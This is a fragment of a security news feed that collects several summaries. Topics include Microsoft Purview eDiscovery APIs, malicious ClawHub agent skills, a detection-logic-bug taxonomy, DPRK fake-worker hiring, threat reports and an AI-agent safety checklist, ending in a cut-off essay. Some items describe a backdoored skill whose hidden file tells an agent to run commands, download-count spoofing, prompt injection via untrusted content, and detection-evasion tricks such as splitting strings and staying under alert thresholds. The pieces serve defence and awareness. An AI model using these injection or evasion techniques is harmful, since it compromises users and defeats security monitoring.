    "summary": "As of December 1 st , 2025, the Microsoft Purview eDiscovery Graph API Standard hit General Availability (GA). It provides a programmatic way to manage eDiscovery cases, searches, holds, and exports for organizations that have only M365 E3 licenses. It extends automation capabilities that were previously exclusive to eDiscovery Premium customers with M365 E5 (or equivalent add-on SKU) licenses. With the eDiscovery Graph APIs, organisations can realise efficiency savings by automating the following elements of their eDiscovery workflow: Case management – create new cases, list or get case details, update cases, and close or reopen cases. Hold management – place content locations on hold (or remove holds) within a case and list hold policies. Search management – create new searches, list existing searches, update search parameters, delete searches, and run a statistics job on a search. View progress of eDiscovery jobs – view lists of all jobs run in the case, including their status and run times. Export operations – trigger an export job from a search, generate an export report, and download the export packages programmatically. Execute Search and Purge operations - ability to purge email messages from mailboxes identified in a modern UX search. For existing customers utilizing the legacy eDiscovery PowerShell cmdlets it presents an opportunity to enrich and enhance any existing automation. eDiscovery Investigators, and teams supporting them, can benefit from the Microsoft Graph-based PowerShell cmdlets to also realize efficiency savings without implementing full end-to-end automation. Why use Graph APIs instead of eDiscovery PowerShell cmdlets? Moving from the old Exchange/Compliance PowerShell cmdlets to Graph API might seem like a significant change. However, there are clear benefits and improvements that make Graph API the better choice for automation. Below we compare legacy eDiscovery scripting methods (PowerShell-based) with the new Graph API approach. What do I need to do to start using the APIs? For customers with only E3 licenses in their tenant, before you can start using the APIs you must enable Microsoft Purview pay-as-you-go features as per the following article: Enable Microsoft Purview pay-as-you-go features via subscription | Microsoft Learn Before you can make any calls to the Microsoft Purview APIs for eDiscovery, you must first register an app in the Microsoft Identity Platform, Entra ID. An application can access data in two ways: App-only access : An app acting with its own identity. Delegated access : An app acting on behalf of a signed-in user. You should decide, based on your organizational needs, which is the appropriate model. For unattended scripts and automation scenarios with no direct user interaction then app-only access would be the equivalent model with the APIs. When using app-only access: You can work with all cases within Microsoft Purview eDiscovery Has the equivalent permissions to the eDiscovery Administrator role For step-by-step guidance on how to set up app-only access to the APIs see the following articles. Set up app-only access for Microsoft Purview eDiscovery by using Microsoft Graph APIs - Microsoft Graph | Microsoft Learn Use Microsoft Purview APIs for eDiscovery | Microsoft Learn If today, your eDiscovery Investigators are connecting to Security & Compliance PowerShell using the Exchange Online PowerShell module and are authenticating as themselves then Delegated access would be the equivalent model with the APIs. Investigators using the Microsoft Graph PowerShell module eDiscovery cmdlets: Can only work with cases they have created or have been granted access to Limits their actions based on the eDiscovery Purview roles assigned to them To enable investigators to authenticate and use the eDiscovery cmdlets from the Microsoft Graph API PowerShell module; the Microsoft Graph Command Line Tools enterprise app must be added to Entra ID and the appropriate Graph API permissions consented to. There are two eDiscovery related Microsoft Graph Permissions and organizations should select the appropriate permissions based on their requirements. They are as follows: eDiscovery.Read.All : Allows the app to read eDiscovery objects such as cases, searches, holds and other related objects ( link ) eDiscovery.ReadWrite.All : Allows the app to read and write eDiscovery objects such as cases, searches, holds and other related objects ( link ) You can check if these permissions are already granted to the Microsoft Graph Command Line Tools by searching for and reviewing the enterprise app in Microsoft Entra. If they have not been granted then an administrator with either the Application Administrator , Cloud Application Administrator or Privileged Role Administrator Entra roles assign can use the following steps to grant the permissions and provide admin consent for all users in the tenant. As delegate permissions are being used in this scenario, even though the consent applies to all users. The signed in user must also be assigned the relevant eDiscovery Purview Roles to make use of the APIs. Install the Microsoft Graph PowerShell Module ( link ) Connect to Microsoft Graph using the following PowerShell cmdlet Connect-MgGraph -scopes \"eDiscovery.ReadWrite.All\" -TenantId \" \" On the permissions screen select “Consent on behalf of your organization” and select accept Now that this has been configured, eDiscovery Investigators will require the Microsoft Graph PowerShell module to connect and make use of the Microsoft Graph PowerShell modules eDiscovery cmdlets. Frequently asked questions Where can I find details on what APIs are available and what they can do? Documentation for the Microsoft Purview eDiscovery Graph APIs can be found here: Use the Microsoft Purview eDiscovery API in Microsoft Graph - Microsoft Graph v1.0 | Microsoft Learn The documentation provides information on what the API call does, what properties are supported and examples of the request and responses. Is there costs associated with using the Microsoft Purview eDiscovery Graph API Standard? Currently, usage of all APIs except the Export API does not contribute towards billing. ediscoverySearch: exportResult - Microsoft Graph v1.0 | Microsoft Learn Usage of the Export API is billed based on the volume of data exported. Each organization receives an included amount of free storage per month (50GB), with additional usage billed at a set price per GB ($10). More information can be found here: Billing in eDiscovery | Microsoft Learn What happens if I have a mix of E3 and E5 licenses? When triggering an export using the Export API for a Microsoft Purview eDiscovery case with the premium features enabled, no costs will be incurred. When triggering an export using the Export API for a Microsoft Purview eDiscovery case with the premium features disabled, it will contribute towards billing. Can I still use PowerShell to work with eDiscovery Cases? Yes, you can use PowerShell cmdlets to work with Microsoft Purview eDiscovery via the APIs. Within the Microsoft Graph PowerShell module there are eDiscovery cmdlets available. When reviewing the API documentation the appropriate PowerShell cmdlets are listed within the examples section. Take, for instance, creating a new case, when reviewing the documentation ( link ), we can see the New-MgSecurityCaseEdiscoveryCase is available. Can I integrate the APIs into a custom-developed application? Yes, you can install the Microsoft Graph SDK and it is available for the following languages: .NET Go Java JavaScript PHP PowerShell Python More information on installing the Microsoft Graph SDK can be found here: Install a Microsoft Graph SDK - Microsoft Graph | Microsoft Learn Do third-party applications integrate with the Microsoft Purview eDiscovery APIs? Please check with your third-party vendor for their support for the Microsoft Purview eDiscovery APIs. Is this available in GCC, GCC High, and DoD tenants? Yes, it is available across these environments. Is there any scenario-based guidance for me with examples on how to use the Graph API? There will be soon! We will be releasing further scenario-based guidance to help both Microsoft 365 E3 and E5 organizations adopt and benefit from the Microsoft Purview eDiscovery Graph APIs.",

I recently interviewed Paul McCarty (maintainer of OpenSourceMalware ) after he found hundreds of malicious skills on ClawHub . But the thing that really made my stomach drop was Jamieson O’Reilly detailed post on how he gamed the system and built malware that became the number 1 downloaded skill on ClawHub -> https://x.com/theonejvo/status/2015892980851474595 (Well worth the read) He built a backdoored (but harmless) skill , then used bots to inflate the download count to 4,000+ , making it the #1 most downloaded skill on ClawHub … and real developers from 7 different countries executed it thinking it was legit. This matters because Peter Steinberger (the creator of OpenClaw) has basically taken the stance of: (Peter has since deleted his responses to this, see screen shots here https://opensourcemalware.com/blog/clawdbot-skills-ganked-your-crypto …but Jamieson’s point is that “use your brain” collapses instantly when the trust signals are fakeable. What Jamieson provedClawHub’s download counter could be manipulated with unauthenticated requests There was no rate limiting The server trusted X-Forwarded-For , meaning you can spoof IPs trivially So an attacker can go: publish malicious skill bot downloads become “#1 skill” profit And the skill itself was extra nasty in a subtle way: the ClawHub UI mostly shows SKILL .md but the real payload lived in a referenced file (ex: rules/logic.md ) meaning users see “clean marketing,” while Claude sees “run these commands” Why ClawHub is a supply chain disaster waiting to happen Skills aren’t libraries, they’re executable instructions The agent already has permissions , and the skill runs inside that trust Popularity is a lie (downloads are a fakeable metric) Peter’s response is basically “don’t be dumb” Most malware so far is low-effort (“curl this auth tool” / ClickFix style) Which means the serious actors haven’t even arrived yet If ClawHub is already full of “dumb malware,” I’d bet anything there’s a room of APTs right now working out how to publish a “top skill” that quietly steals, credentials, crypto... all the things North Korean APTs are trying to steal. I sat down with paul to disucss his research, thoughts and ongoing fights with Peter about making the ecosystem some what secure. https://youtu.be/1NrCeMiEHJM I understand that things are moving quickly but in the words of Paul \"You don't get to leave a loaded ghost gun in a playground and walk away form all responsibility of what comes next\" submitted by /u/Advocatemack [link] [comments]",

    "title": "Building Secure, Enterprise Ready AI Agents with Purview SDK and Agent Framework",
    "summary": "At Microsoft Ignite, we announced the public preview of Purview integration with the Agent Framework SDK —making it easier to build AI agents that are secure, compliant, and enterprise‑ready from day one. AI agents are quickly moving from demos to production. They reason over enterprise data, collaborate with other agents, and take real actions. As that happens, one thing becomes non‑negotiable: Governance has to be built in. That’s where Purview SDK comes in. Agentic AI Changes the Security Model Traditional apps expose risks at the UI or API layer. AI agents are different. Agents can: Process sensitive enterprise data in prompts and responses Collaborate with other agents across workflows Act autonomously on behalf of users Without built‑in controls, even a well‑designed agent can create compliance gaps. Purview SDK brings Microsoft’s enterprise data security and compliance directly into the agent runtime , so governance travels with the agent—not after it. What You Get with Purview SDK + Agent Framework This integration delivers a few key things developers and enterprises care about most: Inline Data Protection Evaluate prompts and responses against Data Loss Prevention (DLP) policies in real time. Content can be allowed or blocked automatically. Built‑In Governance Send AI interactions to Purview for audit, eDiscovery, communication compliance, and lifecycle management —without custom plumbing. Enterprise‑Ready by Design Ship agents that meet enterprise security expectations from the start , not as a follow‑up project. All of this is done natively through Agent Framework middleware , so governance feels like part of the platform—not an add‑on. How Enforcement Works (Quickly) When an agent runs: Prompts and responses flow through the Agent Framework pipeline Purview SDK evaluates content against configured policies A decision is returned: allow, redact, or block Governance signals are logged for audit and compliance This same model works for: User‑to‑agent interactions Agent‑to‑agent communication Multi‑agent workflows Try It: Add Purview SDK in Minutes Here’s a minimal Python example using Agent Framework: That’s it! From that point on: Prompts and responses are evaluated against Purview policies setup within the enterprise tenant Sensitive data can be automatically blocked Interactions are logged for governance and audit Designed for Real Agent Systems Most production AI apps aren’t single‑agent systems. Purview SDK supports: Agent‑level enforcement for fine‑grained control Workflow‑level enforcement across orchestration steps Agent‑to‑agent governance to protect data as agents collaborate This makes it a natural fit for enterprise‑scale, multi‑agent architectures. Get Started Today You can start experimenting right away: Try the Purview SDK with Agent Framework Follow the Microsoft Learn docs to configure Purview SDK with Agent Framework. Explore the GitHub samples See examples of policy‑enforced agents in Python and .NET. Secure AI, Without Slowing It Down AI agents are quickly becoming production systems—not experiments. By integrating Purview SDK directly into the Agent Framework , Microsoft is making governance a default capability , not a deployment blocker. Build intelligent agents. Protect sensitive data.

    "title": "Introducing the Adversarial Detection Engineering Framework: A Taxonomy for Detection Logic Bugs",
    "summary": "https://adeframework.org Detection engineering has matured significantly over the past decade. We now have standardized rule formats like Sigma, comprehensive frameworks like MITRE ATT&CK, and detection-as-code practices embedded in CI/CD pipelines. Yet despite this progress, a fundamental problem persists: our detection rules often fail to detect what they were designed to catch. These failures aren’t always due to missing telemetry or sophisticated evasion techniques. Many stem from something far more preventable — bugs in the detection logic itself. Enter the Adversarial Detection Engineering (ADE) Framework , a new open-source project created by Nikolas Bielski and myself, that provides a formal taxonomy for understanding, classifying, and proactively identifying detection logic bugs before threat actors exploit them. The Hidden Problem: Detection Logic Bugs Every detection rule embodies an intention — what the rule is meant to catch. But there’s often a gap between that intention and what the rule’s logic actually implements. This gap is what the ADE Framework calls a Detection Logic Bug . Consider a simple example: a rule designed to detect PowerShell downloading files might look for Invoke-WebRequest in the command line. The intention is clear—catch PowerShell-based downloads. But PowerShell offers multiple ways to accomplish the same task: wget, curl (aliases), System.Net.WebClient, Start-BitsTransfer, and more. If the rule only checks for Invoke-WebRequest, it contains a logic bug that creates a predictable false negative. This isn’t a tuning issue or a data quality problem. It’s a structural flaw in how the detection logic was written. The ADE Framework argues that these bugs follow predictable patterns and can be systematically identified — if we know what to look for. Thinking Like an Attacker The core insight behind ADE is deceptively simple: instead of waiting for real-world false negatives to reveal themselves in incident response, detection engineers should proactively ask: “What variations would cause this rule’s detection logic to miss what it was intended to catch?” This adversarial line of reasoning mirrors how threat actors already think. Red teamers and malware authors routinely study detection rules to find bypasses. The ADE Framework formalizes this process for defenders, giving them a structured approach to anticipate weaknesses before they’re exploited. The ADE Taxonomy: Four Categories of Logic Bugs The framework organizes detection logic bugs into four top-level categories, each containing specific subcategories with concrete examples and bypass techniques. ADE1: Reformatting in Actions These bugs occur when attackers can achieve the same malicious outcome by reformatting how an action is expressed. The detection rule looks for one specific representation while missing equivalent alternatives. ADE1–01: Substring Manipulation Rules often match specific strings in command lines, file paths, or other fields. Attackers can bypass these by splitting strings, using encoding, inserting characters, or leveraging case sensitivity. Example: A rule detecting OpenProcess in PowerShell scripts can be bypassed by concatenating substrings: $addr = Get-ProcAddress kernel32.dll $(\"Open\" + \"Process\") The function call still executes, but the literal string OpenProcess never appears in the script block. ADE2: Omit Alternatives Perhaps the most common category, these bugs arise when rules check for one method of achieving an objective while ignoring functionally equivalent alternatives. ADE2–01: API/Function Alternatives Operating systems and applications typically offer multiple APIs or functions that accomplish the same task. A rule targeting one API misses attacks using alternatives. Example: Detecting credential dumping via MiniDumpWriteDump misses attacks using NtReadVirtualMemory or direct memory reads via /proc/pid/mem on Linux. ADE2–02: Versioning Software evolves, and so do the artifacts it generates. Rules built for one version may miss attacks on newer or older versions. Example: A rule detecting a specific registry key used by one version of an implant fails when the implant updates its persistence mechanism. ADE2–03: Locations Malicious activity can often occur in multiple locations. Rules focusing on one path miss activity in alternatives. Example: Monitoring C:\\Windows\\Temp for suspicious executables misses the same behavior in C:\\Users\\Public, %APPDATA%\\Local\\Temp, or even the recycle bin. ADE2–04: File Types The same payload can often be delivered in different file formats or extensions. Example: Blocking .js files but not .jse (encoded JScript) allows trivial bypass. ADE3: Context Development These bugs involve manipulating the context in which malicious activity occurs — essentially gaming how detection systems correlate and aggregate events. ADE3–01: Process Cloning Detection rules often track parent-child process relationships. Attackers can break expected chains by injecting into other processes or using intermediate launchers. Example: A rule detecting cmd.exe spawned by outlook.exe is bypassed when the attacker renames a copy ofcmd.exe to svchost.exe. ADE3–02: Aggregation Hijacking Rules that rely on thresholds or counts over time can be bypassed by distributing activity below detection thresholds. Example: A rule alerting on 10+ failed logins in 5 minutes is bypassed by attempting 9 logins per 5-minute window across hours. ADE3–03: Timing and Scheduling Some rules have temporal assumptions that can be exploited. Example: A rule monitoring for suspicious activity during business hours misses scheduled tasks executing at 3 AM. ADE3–04: Event Fragmentation A command entered via CMD can be fragmented across separate events. Example: A rule that detects the command “findstr | lsass” by using a “contains all” condition will never hit because the pipe (|) character in CMD (when not preceded by cmd.exe /c) will split a command into separate event logs. What ADE Is (and Isn’t) It’s worth clarifying the framework’s scope. ADE focuses specifically on detection logic bugs — structural problems in how rules are written that cause them to miss their intended targets. ADE does not cover: Data quality issues : Missing logs, unreliable telemetry, or inconsistent data sources are deployment problems, not logic bugs. Tuning issues : Rules that are too broad and generate excessive false positives aren’t logic bugs — they’re overly sensitive but not structurally broken. Coverage gaps : Attacks using completely novel techniques that no existing rule attempts to detect aren’t logic bugs in existing rules. This focused scope is intentional. By narrowing the problem space, ADE provides actionable guidance that detection engineers can apply to individual rules. How to Use the Framework The ADE Framework is designed for practical application: Study the taxonomy. Understand the categories and subcategories, along with their characteristic patterns. Review your rules through an adversarial lens. For each rule, systematically walk through the ADE categories and ask: “Does this rule have this type of bug?” Use the Bug Likelihood Test. The framework includes a quick checklist to help identify the most likely bugs in any given rule. Document and iterate. When you find potential bugs, document them and update your rules or create companion rules for coverage. The framework integrates naturally with existing detection engineering workflows. It’s particularly valuable during the “Improvement Phase” of detection engineering lifecycles, providing a structured lens for identifying rule weaknesses. Complementing Existing Frameworks ADE doesn’t compete with existing detection engineering resources — it fills a gap they don’t address. MITRE ATT&CK provides a comprehensive taxonomy of adversary techniques, giving us the what to detect. But it doesn’t address how detection logic can fail. Sigma and similar rule formats standardize how we write detection rules, enabling portability across platforms. But they don’t tell us whether our rules are logically sound. Detection Engineering Lifecycle frameworks describe the process of building and maintaining detection capabilities. ADE provides a complementary lens for the improvement and validation phases. ADE fills this gap by providing the first formal theory and taxonomy of detection logic failures. Getting Started The ADE Framework is open source and available on GitHub . The repository includes: Theory documentation : Foundation concepts and definitions Full taxonomy : All categories and subcategories with examples Bug Likelihood Test : Quick-start checklist for rule review Individual category deep-dives : Detailed guidance for each bug type The project is actively seeking contributors to help expand the taxonomy, build static analysis tools for automated bug detection, and create a repository of documented logic bugs from real-world rulesets. Conclusion Detection engineering has long been a craft, learned through experience and failure. The Adversarial Detection Engineering Framework begins to turn it into a discipline with formal foundations. By systematically cataloging how detection logic fails, ADE empowers defenders to think like attackers — proactively identifying weaknesses before they’re exploited in the wild. The framework won’t eliminate false negatives entirely. Some attacks will always slip through. But many of the bypasses that work today succeed not because attackers are brilliant, but because defenders made predictable mistakes in their detection logic. Those mistakes now have names. And when problems have names, they become solvable. Resources: GitHub Repository: Adversarial Detection Engineering Framework Framework Website: adeframework.org Interested in contributing?

    "summary": "Hi r/cybersecurity , I’m Ross McKerchar, CISO at Sophos. (/u/ RossMcKerchar ) Over the last couple of years, many orgs have run into a tough problem of managing or deal\\ *ing* with the reality of North Korean state-sponsored actors infiltrating Western companies as remote IT workers (known as DPRK), we're no exception. This isn't just about someone faking a resume to get a paycheck; it's a coordinated state operation (often linked to groups like Nickel Tapestry) to fund weapons programs and gain backdoors into corporate networks. Why I’m doing this AMA: As a CISO on the operational side of security and tackling these issues, I appreciate the “what” gets plenty of airtime (money/access), but the real challenge is the operational how. Specifically how HR, IT, Legal, and Security all see different pieces, and it’s easy to miss signals or overreact to noise. What we found ( and what we can discuss): Cross-functional detection playbooks — How to set clear roles, escalation paths, and decision thresholds so suspicious signals don’t get stuck between HR, IT, Legal, and Security. “Verify, then trust” for remote hiring — How to design identity assurance that scales: risk-tiered checks, same-person verification from interview to onboarding, and balancing privacy, candidate experience, and compliance. Handling red flags without overreacting — What to do when something feels off: quietly reduce risk, re-verify appropriately, document decisions, and coordinate consistently with HR/Legal. Signals and patterns that actually help defenders — The kinds of indicators teams can watch for across identity, device/network posture, and early-tenure behavior: I’m here to answer questions about: Building workable controls that don’t kill hiring velocity How to partner with HR/Legal teams The reality of \"insider threats\" when the insider was never real to begin with * . * The technical indicators we’ve observed. And...anything else about the CISO role within the cybersecurity industry and how to align security with real business risk Optional (free) resource: My team released our playbook and control matrix you can adapt, but I’ll be answering questions here regardless https://www.sophos.com/en-us/blog/detecting-fraudulent-north-korean-hires-a-ciso-playbook Let’s talk defense.

The Whois-enriched dataset captured registrars, dates, name servers, and basic registrant geography.​ There is a strong concentration around a handful of registrars, privacy protected records, and Cloudflare or Chinese DNS, which together act as early risk signals for coordinated campaigns tied to the ongoing Iran conflict and related information operations.​ Multiple thematic clusters using keywords such as “protests”, “no war”, “sanctions”, “logistics”, “casinos”, and “VPN”, provide high-value predictive indicators for proactive blocking, brand and policy enforcement, and sanctions risk monitoring before full campaigns go live.​ Full report can be read here: https://bfore.ai/report/malicious-infrastructure-campaigns-how-iran-is-weaponized-online/ submitted by /u/aktz23 [link] [comments]",

We assess with high confidence that TGR-STA-1030 is a state-aligned group that operates out of Asia. Over the past year, this group has compromised government and critical infrastructure organizations across 37 countries. This means that approximately one out of every five countries has experienced a critical breach from this group in the past year. Further, between November and December 2025, we observed the group conducting active reconnaissance against government infrastructure associated with 155 countries. This group primarily targets government ministries and departments. For example, the group has successfully compromised: Five national-level law enforcement/border control entities Three ministries of finance and various other government ministries Departments globally that align with economic, trade, natural resources and diplomatic functions Given the scale of compromise and the significance of these organizations, we have notified impacted entities and offered them assistance through responsible disclosure protocols. Here we describe the technical sophistication of the actors, including the phishing and exploitation techniques, tooling and infrastructure used by the group. We provide defensive indicators to include infrastructure that is active at the time of this publication. Further, we explore an in-depth look at victimology by region with the intent of demonstrating the suspected motivations of the group. The results indicate that this group prioritizes efforts against countries that have established or are exploring certain economic partnerships.

    "title": "2025 SLG cyber trends: 5 lessons to build a 2026 cyber roadmap",
    "summary": "From school districts to state agencies, 2025 cyber incidents were a wake-up call about asset visibility. Discover five actionable lessons SLG leaders can use to close the cyber exposure gap and move from reactive threat detection and response to proactive exposure management. Key takeaways Effective cyber defense in 2026 requires state and local government agencies (SLGs) to move beyond scheduled scans to continuous, real-time discovery of all managed and unmanaged digital assets. Consolidating data from siloed cybersecurity tools into a unified visibility layer helps security teams proactively identify the identity, cloud, and network weaknesses attackers are likely to exploit. The 2026 SLG cybersecurity blueprint should focus on identifying and remediating specific exposures that create viable attack paths. Shifting focus from reactive threat detection and response to unified exposure management helps SLGs mitigate risks before they escalate into breaches and cause disruption. In 2025, cyberattacks against state and local governments (SLGs) reached an alarming scale. Publicly reported incidents impacted organizations in 44 U.S. states , disrupting critical services, exposing sensitive data, and straining already limited IT and security resources. From state, local, and education (SLED) to utilities and public safety agencies, the breadth of attacks made one thing clear: cyber risk is systemic. While the tactics varied, the outcomes were strikingly consistent. Attackers exploited security blind spots. They moved laterally across fragmented environments. And in many cases, SLG agencies didn’t realize the true scope of exposure until attackers had already compromised their systems. As state and local leaders look ahead to 2026, the most important question is not whether attacks will continue, but what lessons to apply now to reduce risk moving forward. The 2025 cyber snapshot for SLGs The most significant cyber incidents of 2025 shared several common characteristics: Unknown or unmanaged assets exposed to the internet Unpatched vulnerabilities in legacy systems Misconfigured cloud services introduced during modernization efforts Decentralized environments with limited centralized oversight Delayed detection , allowing attackers to escalate privileges and expand impact In many cases, agencies had security tools in place, but those tools operated in silos. Vulnerability scanners, endpoint detection and response tools, cloud security platforms, and identity systems all generated isolated signals, yet no unified view existed to connect them. This left security teams reacting to alerts rather than understanding how real risk moved through their environments. The result was a widening cyber exposure gap between what agencies thought they had secured and where they actually had exposures. Learn how to apply lessons learned to your 2026 cyber roadmap. Register for the \"Bridging the Cyber Gap\" webinar now . Why 2025 was a turning point for SLG cybersecurity For years, state and local government organizations prioritized reactive cybersecurity approaches. Limited budgets, staffing shortages, and aging infrastructure made it difficult to move beyond compliance checklists and point-in-time security assessments. But the 2025 attacks demonstrated that reactive security no longer matches the speed or sophistication of modern cyber threats . Attackers don’t exploit single vulnerabilities in isolation. They chain together weaknesses across identity systems, endpoints, cloud workloads, and network infrastructure. They target what defenders can’t see, including the weaknesses they don’t realize are connected. This is where many SLGs found themselves in 2025: responding to incidents without a clear understanding of how attackers gained access, where else they could move, or which exposures posed the greatest risk next. From vulnerability management to exposure management While vulnerability management remains an essential foundation for cyber hygiene in any agency, the evolving threat landscape of 2026 requires building upon those basics with a comprehensive exposure management strategy . Rather than replacing vulnerability management, exposure management provides the critical visibility and context needed to scale security efforts across a diverse, modern attack surface. Traditional vulnerability management answers an important question: Which vulnerabilities exist? Exposure management answers a more critical one: Which vulnerabilities actually put the organization at risk, and how could attackers exploit them? A proactive exposure management approach focuses on: Complete asset visibility : Identifying known, unknown (shadow IT), on-prem, cloud, and remote assets Contextual risk prioritization : Understanding which exposures matter most based on exploitability and business impact Attack path analysis: Seeing how individual weaknesses connect across systems Continuous monitoring : Adapting as environments change, not just during scheduled scans For state and local governments, this shift is especially important. Decentralized governance models, independent local agencies, and mixed infrastructure make it nearly impossible to manage cyber risk without a unified view. Learn how to build a 2026 exposure management roadmap for SLGs. Register for the webinar now. 5 cyber lessons for SLG leaders in 2026 SLG leaders can use lessons learned from last year’s cyber incidents to drive action in 2026: 1. You can’t protect what you can’t see In many of the most damaging cyber attacks, threat actors exploited assets agencies didn’t realize were exposed, including S3 buckets in the cloud and network devices on premises. Continuous asset discovery is no longer optional. 2. Cyber risk lives between tools Siloed cloud, identity, OT, AI, and network security tools leave gaps attackers are happy to exploit. Attack surface visibility must extend into AI tools, across systems, teams, and environments, whether cloud or on-prem. 3. Decentralization requires central insight Even when security operations are local, leadership needs centralized visibility into risk across agencies, counties, and districts. 4. Prioritization is everything Security teams can’t fix everything, but they can fix what matters most using threat and business context. 5. Proactive beats reactive, every time Agencies that proactively identify and close exposures dramatically reduce their risk. Preparing SLGs for 2026: Closing the cyber exposure gap As state and local governments move into 2026, cloud adoption will expand, AI tools will introduce new risks , regulatory scrutiny will grow, and attackers will keep targeting the public sector. The agencies best positioned to meet these challenges will be those that move beyond reactive defense and embrace exposure management as a whole-of-state cybersecurity strategy. Bridging the cyber exposure gap doesn’t start with more tools. It starts with better visibility, richer context, smarter prioritization, and a proactive understanding of how risk truly exists across the environment. The lessons of 2025 are clear. The opportunity in 2026 is to act on them. Is your agency ready to build a proactive cybersecurity strategy for 2026? Join us at 2 p.m. ET Feb. 5 for our webinar, \"Bridging the cyber gap: From 2025 hits to 2026 threats,\" where you can dive deeper into these SLG cyber trends and get a blueprint for a proactive defense.

    "title": "Putting together a checklist for safe AI agent use. Please help improve it!",
    "summary": "Hey r/cybersecurity A week ago, I saw a Redditor report a blatant prompt injection in the Clawdbot (Moltbot / OpenClaw) skill library. I've also seen it with my own eyes before the skill got removed. But by that time, there were thousands of potential malware victims among that skill users alone. And turns out there were hundreds of malicious skills hiding all types of attack vectors. Since posts about Clawdbot appear more and more often in our sub (and people will use it no matter how often they will be told not to), I'm putting together a list of actions that can decrease chances of being hacked. This list is probably incomplete, so will appreciate your help with adding / updating stuff to make it more comprehensive. So that it can be used as a go-to resource for spreading awareness in the community! Thanks! ----- Exposed Admin Panels ----- Hundreds of Clawdbot Control interfaces are publicly accessible via Shodan because users deploy on VPS or cloud without authentication (no 1 issue regarding any service actually, talking from a cybersec engineer perspective). Because of this, attackers can view your API keys, OAuth tokens, and full chat histories across all connected platforms. How to mitigate: Never expose the gateway to the internet. Bind to localhost only, use strict firewall rules, and always enable password or token authentication even for local access. ----- Prompt Injection via Untrusted Content ----- Even if you can only message the bot, malicious instructions hidden in emails, documents, or web pages it reads can hijack it. I've mentioned a good example of prompt injection at the beginning of the post. How to mitigate: Use a separate read-only agent to summarize untrusted content before passing to your main agent, and prefer modern instruction-hardened models (Anthropic recommends Claude Opus 4.5 for better injection resistance). ----- Reverse Proxy Authentication Bypass ----- When running behind nginx/Caddy/Traefik, misconfigured proxies make external connections appear as localhost, auto-approving them without credentials. This is the most common attack vector researchers found. How to mitigate: Configure gateway.trustedProxies to only include your actual proxy IP (like 127.0.0.1), and never disable gateway auth. The system will then reject any proxied connection from untrusted sources. ----- Excessive System Privileges ----- Clawdbot has full shell access, can read/write files, execute scripts, and control browsers. Because of this a single compromised prompt could lead to a full device takeover. Running as root without privilege separation can make the situation even worse. How to mitigate: Run in a Docker container with a non-root user, read-only filesystem, --cap-drop=ALL, and mount only a dedicated workspace directory. The ideal case is to use a dedicated machine or VM that doesn't contain sensitive data, but that's something every post about Clawdbot talks about :D ----- Credential Leakage ----- The agent stores API keys, bot tokens, and OAuth secrets in memory and config files. If compromised, attackers get persistent access to all your connected services like Gmail, Slack, Telegram, Signal, etc. How to mitigate: Use credential isolation middleware, apply strict file permissions (700 dirs, 600 files), enable full-disk encryption, and regularly rotate tokens. Consider managed auth solutions that keep raw credentials out of the agent's reach entirely. ----- Outro ----- That's it from the top of my head. I know a lot of this is easier said than done. But if your hard-earned money in a crypto wallet are on the line or the possibility to lose some important data that would never be recovered -- it's worth the time investment. P.S: If you have something to add -- welcome to the comments! I'll keep this post up-to-date and refer to it whenever I see any beginner Clawdbot (or any AI agent usage) posts to spread awareness on safe usage submitted by /u/anthonyDavidson31 [link] [comments]",

    "title": "Pluralistic: All laws are local (05 Feb 2026)",
    "summary": "Today's links All laws are local: And no law knows how evitable it is. Hey look at this: Delights to delectate. Object permanence: Whisky PC; Anitfeatures; Silicon Roundabout; Steampunk Etch-A-Sketch; MLMs as mirror-world organizers. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. All laws are local (permalink) About halfway through Thomas Piketty's 2013 barnstorming Capital in the 21st Century, Piketty tosses off a little insight that skewered me on the spot and never let me go: the notion that any societal condition that endures beyond a generation becomes \"eternal\" in the popular consciousness: https://memex.craphound.com/2014/06/24/thomas-pikettys-capital-in-the-21st-century/ Piketty was referring to \"primogeniture,\" the ancient practice of automatically passing the family fortune onto the eldest son (or, if no son was available, the eldest nephew). Primogeniture did important work by keeping dynastic fortunes intact, rather than dividing them up among all children of some baron or lord or other guillotineable monster. Primogeniture persisted until the age of colonization, when Europe's \"great powers\" stole the rest of the world. In that moment, the size of Europe's great fortunes expanded by orders of magnitude. This vast increase in the wealth of Europe's most murderous, remorseless looters made primogeniture obsolete. There was so much blood-soaked money available to the nobility that every son could found a \"great house.\" After a couple generations' worth of this, the colonies were exhausted. There were no more lands to conquer, which meant that every son could no longer expect to found his own fortune. But for these chinless masters of the universe, a world where every son of every rich man wouldn't get his own dynasty was incomprehensible. To do otherwise was literally unimaginable. It was unnatural. For Piketty, this explained World War I: the world's chinless inbred monsters embarking upon an orgy of bloodletting to relieve one another of the lands – and peoples – they'd claimed as their property in order to carry on the \"eternal\" tradition of every son starting his own fortune. It's a very important idea, and a provocative explanation for one of the 20th Century's defining events. That's why it struck me so hard when I first read it, but the reason it stuck with me for the decade-plus since I encountered that it is a vital observation about the human condition: as a species, we forget so much. Something that was commonplace a generation ago becomes unimaginable today, and vice versa. Even people who lived through those years forget who they were and what they took for granted in those days. Think, for example, of all those evangelicals who would vote for Satan himself if he promised to hang any woman who obtained an abortion; the same evangelicals who, just a few decades ago, viewed anti-abortionism as a politically suspect form of crypto-papacy: https://pluralistic.net/2021/12/18/schizmogenesis/ Perhaps the reason Piketty's primogeniture-based explanation for WWI struck me so forcefully and durably is that I imbibed a prodigious amount of science fiction as a boy, including the aphorism that \"all laws are local, and no law knows how local it is\": https://locusmag.com/feature/cory-doctorow-a-cosmopolitan-literature-for-the-cosmopolitan-web/ In other words, things that seem eternal and innate to the human condition to you are apt to have been invented ten minutes before you started to notice the world around you and might seem utterly alien to your children. As Douglas Adams put it: Anything that is in the world when you're born is normal and ordinary and is just a natural part of the way the world works. Anything that's invented between when you're fifteen and thirty-five is new and exciting and revolutionary and you can probably get a career in it. Anything invented after you're thirty-five is against the natural order of things. https://en.wikiquote.org/wiki/Douglas_Adams This notion is much on my mind right now because the world is (to me, at least) unassailably in a state of change, and everything is up for grabs. Europe went from 15 years behind on its climate goals to ten years ahead of schedule after the supply of Russian gas dried up and Europeans found themselves shivering in the dark. The massive leap in EU solar means that the (seemingly) all-powerful fossil fuel lobby has absolutely, comprehensively eaten shit, something that was unthinkable just a few years ago: https://pluralistic.net/2025/09/23/our-friend-the-electron/#to-every-man-his-castle Indeed, this happened so fast that many people (including many Europeans) haven't even noticed that it happened. Back in December, when I was at CCC in Hamburg, I talked to a bunch of European activists, close watchers of the Commission and the 